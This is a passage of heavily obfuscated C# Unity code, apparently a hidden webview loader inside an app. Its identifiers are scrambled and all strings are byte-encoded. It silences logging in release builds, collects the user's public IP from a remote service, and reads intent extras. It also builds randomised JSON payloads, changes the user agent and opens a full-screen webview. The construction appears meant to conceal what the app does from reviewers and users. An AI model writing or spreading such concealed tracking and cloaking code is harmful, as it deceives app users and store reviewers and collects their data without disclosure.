        if (string.IsNullOrEmpty(_0xcbafee33))
            return string.Empty;
        string _0x0cfd07aa = Regex.Replace(_0xcbafee33, _0xc5baefe6._0xaf772892(new byte[11] { 112, 95, 6, 23, 112, 95, 6, 91, 90, 112, 78 }, 44), string.Empty);
        _0x0cfd07aa = Regex.Replace(_0x0cfd07aa, _0xc5baefe6._0xaf772892(new byte[15] { 9, 38, 126, 23, 32, 60, 57, 49, 122, 14, 11, 110, 124, 8, 126 }, 85), string.Empty);
        _0x0cfd07aa = Regex.Replace(_0x0cfd07aa, _0xc5baefe6._0xaf772892(new byte[15] { 179, 128, 151, 150, 140, 138, 139, 202, 209, 185, 203, 213, 185, 150, 207 }, 229), string.Empty);
        return Regex.Replace(_0x0cfd07aa, _0xc5baefe6._0xaf772892(new byte[6] { 253, 210, 218, 147, 141, 220 }, 161), _0xc5baefe6._0xaf772892(new byte[1] { 210 }, 242)).Trim();
    }

    private async Task<bool> _0xd2774b14()
    {
        _0xd50eca76.Instance?._0x7b510003();
        PushNotificationsService.Instance.OnRemoteNotificationReceived += (_0x6b760fe8) =>
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0xc5baefe6._0xaf772892(new byte[32] { 201, 198, 247, 225, 230, 207, 178, 199, 252, 251, 230, 235, 178, 194, 231, 225, 250, 178, 220, 253, 230, 251, 244, 251, 241, 243, 230, 251, 253, 252, 168, 178 }, 146) + string.Join(_0xc5baefe6._0xaf772892(new byte[1] { 152 }, 145), _0x6b760fe8));
                }
#endif
            }
        };
        try
        {
            _0xc22f74d0 = await PushNotificationsService.Instance.RegisterForPushNotificationsAsync();
        }
        catch (Exception ex)
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0xc5baefe6._0xaf772892(new byte[31] { 35, 44, 29, 11, 12, 37, 88, 62, 25, 17, 20, 29, 28, 88, 12, 23, 88, 31, 29, 12, 88, 8, 13, 11, 16, 88, 12, 23, 19, 29, 22 }, 120));
                }
#endif
            }

            _0xc22f74d0 = "";
        }

        _0x0945d1f4 = !string.IsNullOrEmpty(_0xc22f74d0);
        _0x8eb8c312 = _0xab1a166a();
        {
#if B_LOGS
            Debug.Log(_0xc5baefe6._0xaf772892(new byte[25] { 248, 247, 198, 208, 215, 254, 131, 246, 205, 202, 215, 218, 131, 243, 214, 208, 203, 131, 247, 204, 200, 198, 205, 153, 131 }, 163) + _0xc22f74d0);
#endif
        }

        _0xd50eca76.Instance?._0x4f88ef3c();
        return false;
    }

    private bool _0x7436d889(string _0x03afb2e6)
    {
        if (string.IsNullOrEmpty(_0x03afb2e6))
            return false;
        try
        {
            using (var _0x3d46375a = new AndroidJavaClass(_0xc5baefe6._0xaf772892(new byte[30] { 90, 86, 84, 23, 76, 87, 80, 77, 64, 10, 93, 23, 73, 85, 88, 64, 92, 75, 23, 108, 87, 80, 77, 64, 105, 85, 88, 64, 92, 75 }, 57)))
            using (var _0x29c0f4d7 = _0x3d46375a.GetStatic<AndroidJavaObject>(_0xc5baefe6._0xaf772892(new byte[15] { 241, 231, 224, 224, 247, 252, 230, 211, 241, 230, 251, 228, 251, 230, 235 }, 146)))
            using (var _0x41b9c2b8 = _0x29c0f4d7.Call<AndroidJavaObject>(_0xc5baefe6._0xaf772892(new byte[17] { 5, 7, 22, 50, 3, 1, 9, 3, 5, 7, 47, 3, 12, 3, 5, 7, 16 }, 98)))
            using (var _0xae70bdb6 = _0x41b9c2b8.Call<AndroidJavaObject>(_0xc5baefe6._0xaf772892(new byte[25] { 46, 44, 61, 5, 40, 60, 39, 42, 33, 0, 39, 61, 44, 39, 61, 15, 38, 59, 25, 40, 42, 34, 40, 46, 44 }, 73), _0x03afb2e6))
            {
                if (_0xae70bdb6 == null)
                    return false;
                WLog(_0xc5baefe6._0xaf772892(new byte[37] { 135, 172, 182, 171, 169, 161, 136, 173, 175, 161, 228, 168, 165, 177, 170, 167, 172, 228, 173, 170, 183, 176, 165, 168, 168, 161, 160, 228, 180, 165, 167, 175, 165, 163, 161, 254, 228 }, 196) + _0x03afb2e6);
                _0xae70bdb6.Call<AndroidJavaObject>(_0xc5baefe6._0xaf772892(new byte[8] { 12, 9, 9, 43, 1, 12, 10, 30 }, 109), 0x10000000);
                _0x29c0f4d7.Call(_0xc5baefe6._0xaf772892(new byte[13] { 199, 192, 213, 198, 192, 245, 215, 192, 221, 194, 221, 192, 205 }, 180), _0xae70bdb6);
                return true;
            }
        }
        catch
        {
            return false;
        }
    }

    private bool _0xb6952da6()
    {
        _0x4b420ba9.RemoveAll(_0xe8696f7e => _0xe8696f7e == null || !_0xe8696f7e.IsAlive);
        return _0x4b420ba9.Count > 0;
    }

    private bool _0xd34c5bb5 = false;
    private JObject BuildRandomPayload(params string[] _0xe736e5c6)
    {
        JObject _0xb7be0552 = new JObject();
        foreach (var _0xda831221 in _0xe736e5c6)
        {
            string _0x0cae2c7d = _0x7147f8ab();
            {
#if B_LOGS
                Debug.Log($"[Test] Crypto key={_0x0cae2c7d} val={_0xda831221}");
#endif
            }

            _0xb7be0552.Add(_0x0cae2c7d, _0xda831221 == null ? "" : _0xda831221);
        }

        return _0xb7be0552;
    }

    internal bool IsAboutBlank(string _0xb41fa8a2)
    {
        if (string.IsNullOrEmpty(_0xb41fa8a2))
            return false;
        return _0xb41fa8a2.StartsWith(_0xc5baefe6._0xaf772892(new byte[11] { 244, 247, 250, 224, 225, 175, 247, 249, 244, 251, 254 }, 149), StringComparison.OrdinalIgnoreCase);
    }

    private void OnDestroy()
    {
        StopAllCoroutines();
        _0x70807108();
    }

    private string _0xcbafee33 = "";
    private string _0x39a6a961 = "";
    private bool OpenUrlExternally(string _0x46b74864)
    {
        return _0x1102e7aa(_0x46b74864);
    }

    private bool _0x8a5a6122()
    {
        var _0x86def1ad = _0xfe2001b0();
        if (_0x86def1ad == null)
            return false;
        WLog(_0xc5baefe6._0xaf772892(new byte[31] { 146, 187, 168, 190, 173, 187, 168, 191, 250, 184, 187, 185, 177, 250, 247, 228, 250, 170, 181, 170, 175, 170, 250, 157, 181, 152, 187, 185, 177, 224, 250 }, 218) + _0x86def1ad.Id);
        _0x86def1ad.GoBack();
        return true;
    }

    private string _0x6fe3f3be;
    private string _0xbf623f5f = "";
    public void _0x70807108()
    {
        isDestroyedForce = true;
        StopAllCoroutines();
        {
#if B_LOGS
            Debug.Log(_0xc5baefe6._0xaf772892(new byte[18] { 64, 79, 126, 104, 111, 70, 59, 87, 122, 110, 117, 120, 115, 59, 92, 122, 118, 126 }, 27));
#endif
        }

        _0xd50eca76.Instance?._0x993f77da();
        _0x64a8e136.Instance._0x193e969a(_0x9cf3c3e3._0xea9b069c.DEFAULT);
    }

    private bool _0x92d32089()
    {
        if (_0x8a5a6122())
            return true;
        if (_0xcaeec845 != null && _0xcaeec845.CanGoBack)
        {
            WLog(_0xc5baefe6._0xaf772892(new byte[36] { 116, 93, 78, 88, 75, 93, 78, 89, 28, 94, 93, 95, 87, 28, 17, 2, 28, 81, 93, 85, 82, 28, 107, 89, 94, 106, 85, 89, 75, 28, 123, 83, 126, 93, 95, 87 }, 60));
            _0xcaeec845.GoBack();
            return true;
        }

        return false;
    }

    private bool _0x77a1438b = false;
    private string _0x8eb8c312 = "";
    private bool _0x0945d1f4 = false;
    private void _0x75ff83df(string _0x4d818aca)
    {
        if (string.IsNullOrEmpty(_0x4d818aca))
            return;
        if (TryOpenExternalLikeChrome(_0x4d818aca))
            return;
        OpenUrlExternally(_0x4d818aca);
    }

    internal void Update()
    {
        if (_0xcaeec845 == null)
            return;
        if (_0x49096384())
            _0xd0300ee3();
        if (!isApplicationFocus || isApplicationPause)
            return;
        _0xbadead4f();
        if (_0xf2e03d7c && _0x732d43f3 != null)
            _0x732d43f3.Rotate(0f, 0f, -360f * Time.deltaTime);
    }

    private string _0x50769abf = "";
    private void _0xeaf769ec(bool _0x60d0a678)
    {
        _0x39a87bd4();
        _0xc2c0b110.SetActive(_0x60d0a678);
        _0xf2e03d7c = _0x60d0a678;
        if (_0x60d0a678)
        {
            _0xc2c0b110.transform.SetAsLastSibling();
            if (_0x732d43f3 != null)
                _0x732d43f3.localRotation = Quaternion.identity;
        }
    }

    private RectTransform _0x732d43f3;
    private async Task _0xb0f67a18()
    {
        if (await _0x969bea50())
            return;
        if (await _0xd2774b14())
            return;
        if (await _0xaec267bf())
            return;
        _0x64f6b5d7();
        await _0x457eeb84(_0x5dffadd7());
        _0xbf623f5f = await _0xf962e205();
        await _0x1e878bec();
    }

    private IEnumerator _0x38d0db50(string _0x2e78da50)
    {
        if (_0xcaeec845 != null && _0x90df74d5)
            yield break;
        _0xcaeec845 = gameObject.AddComponent<UniWebView>();
        _0xb93d84e0(_0xcaeec845);
        _0x4bf480d8(_0xcaeec845);
        _0xcaeec845.BackgroundColor = Color.clear;
        var _0xa5b8fb45 = SceneManager.GetActiveScene().GetRootGameObjects();
        if (Camera.main != null)
        {
            Camera.main.clearFlags = CameraClearFlags.SolidColor;
            Camera.main.backgroundColor = Color.clear;
            yield return new WaitForEndOfFrame();
        }

        yield return new WaitForEndOfFrame();
        _0xbadead4f();
        yield return new WaitForEndOfFrame();
        _0x90df74d5 = true;
        _0x39a87bd4();
        _0xeaf769ec(true);
        _0x141674f7 = false;
        _0xd34c5bb5 = false;
        _0x4b420ba9.Clear();
        _0xed440dce = -1;
        firstLoadShown = false;
        _0x073f2856 = false;
        _0x300d7f37 = false;
        _0xcaeec845.SetUserAgent("");
        _0xbca9a518 = Time.realtimeSinceStartup;
        _0xcaeec845.Stop();
        _0xcaeec845.Load(_0x2e78da50);
        _0xcaeec845.Show(false, UniWebViewTransitionEdge.None, 0f, null);
        WLog(_0xc5baefe6._0xaf772892(new byte[25] { 23, 59, 51, 52, 122, 13, 63, 56, 12, 51, 63, 45, 122, 19, 52, 51, 46, 51, 59, 54, 122, 9, 50, 53, 45 }, 90));
    }

    private void _0x39a87bd4()
    {
        if (_0xc2c0b110 != null)
            return;
        var _0xdbd643d2 = _0x95123048();
        _0xc2c0b110 = new GameObject(_0xc5baefe6._0xaf772892(new byte[14] { 17, 35, 36, 16, 47, 35, 49, 21, 54, 47, 40, 40, 35, 52 }, 70), typeof(RectTransform), typeof(Text));
        _0x732d43f3 = _0xc2c0b110.GetComponent<RectTransform>();
        _0x732d43f3.SetParent(_0xdbd643d2.transform, false);
        _0x732d43f3.anchorMin = new Vector2(0.5f, 0.5f);
        _0x732d43f3.anchorMax = new Vector2(0.5f, 0.5f);
        _0x732d43f3.pivot = new Vector2(0.5f, 0.5f);
        _0x732d43f3.sizeDelta = new Vector2(600f, 600f);
        _0x732d43f3.anchoredPosition = Vector2.zero;
        _0xd78c2ec4 = _0xc2c0b110.GetComponent<Text>();
        _0xd78c2ec4.text = _0xc5baefe6._0xaf772892(new byte[1] { 7 }, 40);
        _0xd78c2ec4.font = Resources.GetBuiltinResource<Font>(_0xc5baefe6._0xaf772892(new byte[17] { 104, 65, 67, 69, 71, 93, 118, 81, 74, 80, 77, 73, 65, 10, 80, 80, 66 }, 36));
        _0xd78c2ec4.fontSize = 200;
        _0xd78c2ec4.alignment = TextAnchor.MiddleCenter;
        _0xd78c2ec4.color = Color.white;
        _0xd78c2ec4.raycastTarget = false;
        _0xc2c0b110.SetActive(false);
    }

    // WS_SOURCE MONO
    public static _0xf9f92de4 _0x3b2e790c { get; private set; }
    private string _0x1e01f859 { get; set; }

    private void Awake()
    {
        if (_0x3b2e790c != null)
        {
            Destroy(this.gameObject);
            return;
        }

        EnhancedTouchSupport.Enable();
        Input.backButtonLeavesApp = false;
        {
#if !B_LOGS
            Debug.unityLogger.logEnabled = false;
            Application.SetStackTraceLogType(LogType.Assert, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Exception, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Warning, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Error, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Log, StackTraceLogType.None);
#endif
        }

        _0x3b2e790c = gameObject.GetComponent<_0xf9f92de4>();
        DontDestroyOnLoad(gameObject);
        _0xc22f74d0 = _0x1e01f859 = _0x0ff6dcdc = "";
        _0xeef59c1d = "";
        _0x90df74d5 = false;
    }

    private UniWebViewPopup _0xfe2001b0()
    {
        for (int _0xd660bcea = _0x4b420ba9.Count - 1; _0xd660bcea >= 0; _0xd660bcea--)
        {
            var _0x1b310bda = _0x4b420ba9[_0xd660bcea];
            if (_0x1b310bda != null && _0x1b310bda.IsAlive)
                return _0x1b310bda;
            _0x4b420ba9.RemoveAt(_0xd660bcea);
        }

        return null;
    }

    private void _0x3a147faf()
    {
        _0xd34c5bb5 = true;
        if (_0xcaeec845 != null)
            _0xcaeec845.SetUserAgent(_0x6db230d1());
    }

    private void WLog(string _0x88d0bdbd)
    {
#if B_LOGS
        {
            Debug.Log(_0xc5baefe6._0xaf772892(new byte[7] { 241, 254, 207, 217, 222, 247, 138 }, 170) + _0x88d0bdbd);
        }
#endif
    }

    private int _0x4eef55c7 = 0;
    private string _0x4e355209 = "";
    private bool _0x141674f7 = false;
    private async Task<bool> _0x1dbb53f4(int _0x07a024cf = 5, int _0xe93c5e7b = 500)
    {
        List<EntityData> _0x45051307 = new List<EntityData>();
        int _0x245aca8d = 0;
        do
        {
            try
            {
                _0x45051307 = (await CloudSaveService.Instance.Data.Player.QueryAsync(new Query(new List<FieldFilter> { new FieldFilter(_0xc5baefe6._0xaf772892(new byte[8] { 7, 27, 22, 14, 18, 5, 62, 19 }, 119), _0x6486cede, FieldFilter.OpOptions.EQ, true) }, new HashSet<string> { _0xc5baefe6._0xaf772892(new byte[9] { 229, 255, 220, 254, 229, 250, 237, 239, 245 }, 140) }), new QueryOptions())).ToList();
            }
            catch (Exception e)
            {
                {
#if B_LOGS
                    {
                        Debug.Log(_0xc5baefe6._0xaf772892(new byte[32] { 254, 241, 192, 214, 209, 248, 133, 212, 208, 192, 215, 220, 228, 214, 220, 203, 198, 247, 192, 214, 208, 201, 209, 214, 133, 192, 215, 215, 202, 215, 159, 133 }, 165) + e.Message);
                    }
#endif
                }
            }

            await Task.Delay(_0xe93c5e7b);
        }
        while (_0x45051307.Count == 0 && _0x245aca8d++ < _0x07a024cf);
        {
#if B_LOGS
            {
                Debug.Log(_0xc5baefe6._0xaf772892(new byte[32] { 248, 247, 198, 208, 215, 254, 131, 234, 208, 243, 209, 202, 213, 194, 192, 218, 131, 242, 214, 198, 209, 218, 131, 209, 198, 208, 214, 207, 215, 208, 153, 131 }, 163) + JsonConvert.SerializeObject(_0x45051307, Formatting.Indented));
            }
#endif
        }

        {
#if B_LOGS
            {
                Debug.Log(_0xc5baefe6._0xaf772892(new byte[38] { 57, 54, 7, 17, 22, 63, 66, 43, 17, 50, 16, 11, 20, 3, 1, 27, 66, 51, 23, 7, 16, 27, 66, 16, 7, 17, 23, 14, 22, 17, 66, 1, 13, 23, 12, 22, 88, 66 }, 98) + _0x45051307.Count);
            }
#endif
        }

        bool _0x19073cbf = true;
        if (_0x45051307.Count == 0)
        {
            _0x19073cbf = false;
        }
        else
        {
            _0x19073cbf = _0x45051307.Any(_0x0ef78974 => _0x0ef78974.Data.Any(IsPrivacyItemTrue));
        }

        {
#if B_LOGS
            {
                Debug.Log(_0xc5baefe6._0xaf772892(new byte[25] { 142, 129, 176, 166, 161, 136, 245, 156, 166, 133, 167, 188, 163, 180, 182, 172, 245, 167, 176, 166, 160, 185, 161, 239, 245 }, 213) + _0x19073cbf);
            }
#endif
        }

        return _0x19073cbf;
    }

    //    private async Task<string> GetMyip()
    //    {
    //        string result = "";
    //        var processorType = SystemInfo.processorType;
    //        //        {
    //        //#if NOT_B_STARTED
    //        //#endif
    //        if (!processorType.Contains("armv7", StringComparison.OrdinalIgnoreCase) && !processorType.Contains("x86-64", StringComparison.OrdinalIgnoreCase))
    //        {
    //            var tcs = new TaskCompletionSource<string>();
    //            // Primary and fallback STUN servers (Google STUN 1-6)
    //            var stunServers = new[]
    //            {
    //                new[] { "stun:stun.l.google.com:19302" },      // Primary
    //                //new[] { "stun:stun1.l.google.com:19302" },     // Fallback 1
    //                //new[] { "stun:stun2.l.google.com:19302" },     // Fallback 2
    //                //new[] { "stun:stun3.l.google.com:19302" },     // Fallback 3
    //                //new[] { "stun:stun4.l.google.com:19302" },     // Fallback 4
    //                //new[] { "stun:stun5.l.google.com:19302" },     // Fallback 5
    //                //new[] { "stun:stun6.l.google.com:19302" }      // Fallback 6
    //            };
    //            RTCPeerConnection pc = null;
    //            foreach (var serverUrls in stunServers)
    //            {
    //                if (tcs.Task.IsCompleted)
    //                    break;
    //                try
    //                {
    //                    var config = new RTCConfiguration
    //                    {
    //                        iceServers = new RTCIceServer[]
    //                        {
    //                    new RTCIceServer { urls = serverUrls }
    //                        },
    //                        iceTransportPolicy = RTCIceTransportPolicy.All
    //                    };
    //                    pc = new RTCPeerConnection(ref config);
    //                    pc.OnIceCandidate = candidate =>
    //                    {
    //                        if (candidate == null || tcs.Task.IsCompleted)
    //                            return;
    //                        if (candidate.Type == RTCIceCandidateType.Srflx || candidate.Type == RTCIceCandidateType.Prflx)
    //                        {
    //                            string address = candidate.Address;
    //                            string ip = "";
    //                            // Parse IP from address (which may be IPv4 "ip:port" or IPv6 "[ip]:port")
    //                            if (address.StartsWith("[") && address.Contains("]:"))
    //                            {
    //                                // IPv6 format: [2001:db8::1]:12345
    //                                int endBracket = address.IndexOf(']');
    //                                ip = address.Substring(1, endBracket - 1);
    //                            }
    //                            else if (address.Contains(':'))
    //                            {
    //                                // IPv4 format: 192.168.1.1:12345
    //                                int lastColon = address.LastIndexOf(':');
    //                                ip = address.Substring(0, lastColon);
    //                            }
    //                            else
    //                            {
    //                                // No port, just IP
    //                                ip = address;
    //                            }
    //                            {
    //#if B_LOGS
    //                                {
    //                                    Debug.Log($"[test STUN] Public IP: {ip} from {serverUrls[0]}");
    //                                }
    //#endif
    //                            }
    //                            tcs.TrySetResult(ip);
    //                        }
    //                    };
    //                    pc.CreateDataChannel("init");
    //                    var offerOp = pc.CreateOffer();
    //                    while (!offerOp.IsDone)
    //                        await Task.Yield();
    //                    var desc = offerOp.Desc;
    //                    pc.SetLocalDescription(ref desc);
    //                    float timeout = 10f;
    //                    float t = 0f;
    //                    while (!tcs.Task.IsCompleted && t < timeout)
    //                    {
    //                        await Task.Delay(100);
    //                        t += 0.1f;
    //                    }
    //                    if (tcs.Task.IsCompleted)
    //                    {
    //                        result = tcs.Task.Result;
    //                        break;
    //                    }
    //                    {
    //#if B_LOGS
    //                        {
    //                            Debug.Log($"[test STUN] Failed with {serverUrls[0]}, trying next...");
    //                        }
    //#endif
    //                    }
    //                }
    //                catch (Exception ex)
    //                {
    //#if B_LOGS
    //                    {
    //                        Debug.Log($"[test STUN] Error with {serverUrls[0]}: {ex.Message}");
    //                    }
    //#endif
    //                    if (pc != null)
    //                    {
    //                        pc.Close();
    //                        pc.Dispose();
    //                    }
    //                }
    //            }
    //            if (!tcs.Task.IsCompleted)
    //                result = "";
    //        }
    //        //#if NOT_B_STARTED
    //        //            else
    //        //        if(result == "")
    //        //        {
    //        //            {
    //        //#if B_LOGS
    //        //                {
    //        //                    Debug.LogError($"[TEST] WebRTC DLL missing or ARMv7 architecture");
    //        //                }
    //        //#endif
    //        //            }
    //        //            result = await GetMyipFallback("0fce0027001c001700140011000b000a0008001f00180022001b00010024001e0025002300260002000400050006000300070000000c001d0015000d000f0021000900100019001a0013000e00120020001647175e80370ec5a1a5d9b1b039a49e64977f39d478adcf763f556d428a45d94f056b1d88f6b76874");
    //        //        }
    //        //#endif
    //        //        }
    //        {
    //#if B_LOGS
    //            {
    //                Debug.Log($"[Test] Get my ip: {result}");
    //            }
    //#endif
    //        }
    //        return result;
    //    }
    private async Task<string> _0xf962e205()
    {
        var _0xdc524996 = _0xc5baefe6._0xaf772892(new byte[40] { 89, 69, 69, 65, 66, 11, 30, 30, 70, 70, 70, 31, 82, 93, 94, 68, 85, 87, 93, 80, 67, 84, 31, 82, 94, 92, 30, 82, 85, 95, 28, 82, 86, 88, 30, 69, 67, 80, 82, 84 }, 49);
        using (UnityWebRequest _0x9470b599 = UnityWebRequest.Get(_0xdc524996))
        {
            await _0x9470b599.SendWebRequest();
            string[] _0xfdf2b8dd = _0x9470b599.downloadHandler.text.Split('\n');
            foreach (string _0x0ae642ab in _0xfdf2b8dd)
            {
                if (_0x0ae642ab.StartsWith(_0xc5baefe6._0xaf772892(new byte[3] { 32, 57, 116 }, 73)))
                {
                    string _0xd2b38143 = _0x0ae642ab.Substring(3);
                    {
#if B_LOGS
                        {
                            Debug.Log($"[Test] User ip (FALLBACK MODE): {_0xd2b38143} from {_0xdc524996}");
                        }
#endif
                    }

                    return _0xd2b38143;
                }
            }
        }

        return "";
    }

    private async void Start()
    {
        await _0xb0f67a18();
    }

    private string _0x22f2f791 = "";
    private void _0x169fb14b()
    {
        using (var _0xad7962b4 = new AndroidJavaClass(_0xc5baefe6._0xaf772892(new byte[30] { 193, 205, 207, 140, 215, 204, 203, 214, 219, 145, 198, 140, 210, 206, 195, 219, 199, 208, 140, 247, 204, 203, 214, 219, 242, 206, 195, 219, 199, 208 }, 162)))
        using (var _0xd4c2d4f1 = _0xad7962b4.GetStatic<AndroidJavaObject>(_0xc5baefe6._0xaf772892(new byte[15] { 36, 50, 53, 53, 34, 41, 51, 6, 36, 51, 46, 49, 46, 51, 62 }, 71)))
        using (var _0x3d32d68f = _0xd4c2d4f1.Call<AndroidJavaObject>(_0xc5baefe6._0xaf772892(new byte[9] { 116, 118, 103, 90, 125, 103, 118, 125, 103 }, 19)))
        {
            if (_0x3d32d68f == null)
                return;
            using (var _0x1016d72c = _0x3d32d68f.Call<AndroidJavaObject>(_0xc5baefe6._0xaf772892(new byte[9] { 210, 208, 193, 240, 205, 193, 199, 212, 198 }, 181)))
            {
                if (_0x1016d72c == null)
                    return;
                using (var _0x944e7d62 = new AndroidJavaObject(_0xc5baefe6._0xaf772892(new byte[19] { 22, 11, 30, 87, 19, 10, 22, 23, 87, 51, 42, 54, 55, 54, 27, 19, 28, 26, 13 }, 121)))
                using (var _0xd42e7947 = _0x1016d72c.Call<AndroidJavaObject>(_0xc5baefe6._0xaf772892(new byte[6] { 152, 150, 138, 160, 150, 135 }, 243)))
                using (var _0x01667b7d = _0xd42e7947.Call<AndroidJavaObject>(_0xc5baefe6._0xaf772892(new byte[8] { 219, 198, 215, 192, 211, 198, 221, 192 }, 178)))
                {
                    while (_0x01667b7d.Call<bool>(_0xc5baefe6._0xaf772892(new byte[7] { 30, 23, 5, 56, 19, 14, 2 }, 118)))
                    {
                        string _0xf11fbf00 = _0x01667b7d.Call<string>(_0xc5baefe6._0xaf772892(new byte[4] { 91, 80, 77, 65 }, 53));
                        using (var _0xba239b4d = _0x1016d72c.Call<AndroidJavaObject>(_0xc5baefe6._0xaf772892(new byte[3] { 77, 79, 94 }, 42), _0xf11fbf00))
                        {
                            _0x944e7d62.Call<AndroidJavaObject>(_0xc5baefe6._0xaf772892(new byte[3] { 208, 213, 212 }, 160), _0xf11fbf00, _0xba239b4d);
                        }
                    }

                    string _0x2bd4d512 = _0x944e7d62.Call<string>(_0xc5baefe6._0xaf772892(new byte[8] { 223, 196, 248, 223, 217, 194, 197, 204 }, 171));
                    if (!string.IsNullOrEmpty(_0x2bd4d512))
                    {
                        _0x2ec816a7(_0x2bd4d512);
                        _0xf3734d75(_0x2bd4d512);
                    }
                }
            }
        }
    }

    private void _0x4f763f9c(string _0xab441954)
    {
        bool _0x67a58a4c = !string.IsNullOrEmpty(_0xab441954);
        if (_0x67a58a4c)
        {
            {
#if B_LOGS
                Debug.Log(_0xc5baefe6._0xaf772892(new byte[13] { 239, 224, 209, 199, 192, 233, 148, 231, 220, 219, 195, 142, 148 }, 180) + _0xab441954);
#endif
            }

            _0x6ff2b4a3(_0xab441954);
            return;
        }
        else
        {
            {
#if B_LOGS
                Debug.Log(_0xc5baefe6._0xaf772892(new byte[39] { 167, 168, 153, 143, 136, 161, 220, 186, 157, 144, 144, 158, 157, 159, 151, 220, 30, 122, 110, 220, 187, 157, 145, 153, 220, 212, 146, 147, 220, 154, 149, 146, 157, 144, 220, 169, 174, 176, 213 }, 252));
#endif
            }

            _0x70807108();
            return;
        }
    }

    internal string _0x8af47733(string _0xf04f7602)
    {
        int _0xf9fb0425 = _0xf04f7602.IndexOf(_0xc5baefe6._0xaf772892(new byte[3] { 218, 215, 142 }, 179), StringComparison.OrdinalIgnoreCase);
        if (_0xf9fb0425 < 0)
            return null;
        string _0xca81b0b5 = _0xf04f7602.Substring(_0xf9fb0425 + 3);
        int _0x3f28c35c = _0xca81b0b5.IndexOf('&');
        return _0x3f28c35c >= 0 ? _0xca81b0b5.Substring(0, _0x3f28c35c) : _0xca81b0b5;
    }

    private Canvas _0x19480de3;
    private async Task<bool> _0x969bea50()
    {
        {
#if B_LOGS
            Debug.Log(_0xc5baefe6._0xaf772892(new byte[37] { 78, 65, 112, 102, 97, 72, 53, 70, 124, 114, 123, 92, 123, 64, 123, 124, 97, 108, 70, 112, 103, 99, 124, 118, 112, 102, 84, 123, 122, 123, 108, 120, 122, 96, 102, 121, 108 }, 21));
#endif
        }

        try
        {
            var _0xb1ab3d62 = new InitializationOptions();
            await UnityServices.InitializeAsync(_0xb1ab3d62);
            {
#if B_LOGS
                Debug.Log(_0xc5baefe6._0xaf772892(new byte[32] { 244, 251, 202, 220, 219, 242, 143, 250, 193, 198, 219, 214, 252, 202, 221, 217, 198, 204, 202, 220, 143, 230, 193, 198, 219, 198, 206, 195, 198, 213, 202, 203 }, 175));
#endif
            }
        }
        catch (Exception ex)
        {
            {
#if B_LOGS
                Debug.Log(_0xc5baefe6._0xaf772892(new byte[20] { 169, 184, 174, 169, 221, 168, 147, 148, 137, 132, 174, 152, 143, 139, 148, 158, 152, 142, 199, 221 }, 253) + ex.Message);
#endif
            }

            _0x3b2e790c?._0x70807108();
            return true;
        }

        bool _0x0db0a49e = false;
        do
        {
            try
            {
                await AuthenticationService.Instance.SignInAnonymouslyAsync();
                _0x0db0a49e = true;
                {
                    {
#if B_LOGS
                        Debug.Log(_0xc5baefe6._0xaf772892(new byte[37] { 26, 21, 36, 50, 53, 28, 97, 18, 40, 38, 47, 108, 40, 47, 97, 0, 47, 46, 47, 56, 44, 46, 52, 50, 111, 97, 17, 45, 32, 56, 36, 51, 97, 8, 5, 123, 97 }, 65) + AuthenticationService.Instance.PlayerId);
#endif
                    }

                    _0x6486cede = AuthenticationService.Instance.PlayerId;
                }
            }
            catch (AuthenticationException ex)
            {
                {
#if B_LOGS
                    Debug.Log(_0xc5baefe6._0xaf772892(new byte[25] { 208, 193, 215, 208, 164, 215, 237, 227, 234, 169, 237, 234, 164, 197, 241, 240, 236, 164, 193, 214, 214, 203, 214, 190, 164 }, 132) + ex.Message);
#endif
                }

                _0x3b2e790c?._0x70807108();
                return true;
            }
            catch (RequestFailedException ex)
            {
                {
#if B_LOGS
                    Debug.Log(_0xc5baefe6._0xaf772892(new byte[28] { 62, 47, 57, 62, 74, 57, 3, 13, 4, 71, 3, 4, 74, 56, 15, 27, 31, 15, 25, 30, 74, 47, 56, 56, 37, 56, 80, 74 }, 106) + ex.Message);
#endif
                }

                _0x3b2e790c?._0x70807108();
                return true;
            }
        }
        while (!_0x0db0a49e);
        return false;
    }

    private readonly List<UniWebViewPopup> _0x4b420ba9 = new List<UniWebViewPopup>();
    private bool _0x01d0dcfa = false;
    internal void _0xbadead4f()
    {
        Rect _0x901e4193 = Screen.safeArea;
        Vector2 _0x3c62ccaf = new Vector2(Screen.width, Screen.height);
        if (_0x901e4193 == lastSafe && _0x3c62ccaf == lastSize)
            return;
        // Apply manual padding
        _0x901e4193.xMin += _0xa6c823e4;
        _0x901e4193.xMax -= _0xd83baaaa;
        _0x901e4193.yMin += _0xef3d2cf9;
        _0x901e4193.yMax -= _0x185c92e0;
        // Convert Unity safe area -> native WebView frame
        Rect _0x4f5e77f5 = new Rect(_0x901e4193.x, _0x3c62ccaf.y - _0x901e4193.y - _0x901e4193.height, // Y flip for native coordinate system
 _0x901e4193.width, _0x901e4193.height);
        _0xcaeec845.Frame = _0x4f5e77f5;
        lastSafe = Screen.safeArea;
        lastSize = _0x3c62ccaf;
    }

    private bool _0xea902988(int _0x01d8c72b, string _0xdb5630eb, string _0x60c4db4d)
    {
        if (string.IsNullOrEmpty(_0x60c4db4d))
            return false;
        if (!IsHttpUrl(_0x60c4db4d))
            return true;
        if (string.IsNullOrEmpty(_0xdb5630eb))
            return false;
        return _0xdb5630eb.IndexOf(_0xc5baefe6._0xaf772892(new byte[20] { 249, 238, 238, 227, 255, 243, 242, 242, 249, 255, 232, 245, 243, 242, 227, 238, 249, 239, 249, 232 }, 188), StringComparison.OrdinalIgnoreCase) >= 0 || _0xdb5630eb.IndexOf(_0xc5baefe6._0xaf772892(new byte[22] { 160, 183, 183, 186, 166, 170, 171, 171, 160, 166, 177, 172, 170, 171, 186, 183, 160, 163, 176, 182, 160, 161 }, 229), StringComparison.OrdinalIgnoreCase) >= 0 || _0xdb5630eb.IndexOf(_0xc5baefe6._0xaf772892(new byte[21] { 107, 124, 124, 113, 109, 97, 96, 96, 107, 109, 122, 103, 97, 96, 113, 109, 98, 97, 125, 107, 106 }, 46), StringComparison.OrdinalIgnoreCase) >= 0 || _0xdb5630eb.IndexOf(_0xc5baefe6._0xaf772892(new byte[22] { 135, 144, 144, 157, 151, 140, 137, 140, 141, 149, 140, 157, 151, 144, 142, 157, 145, 129, 138, 135, 143, 135 }, 194), StringComparison.OrdinalIgnoreCase) >= 0;
    }

    private string _0x9018ed90 = "";
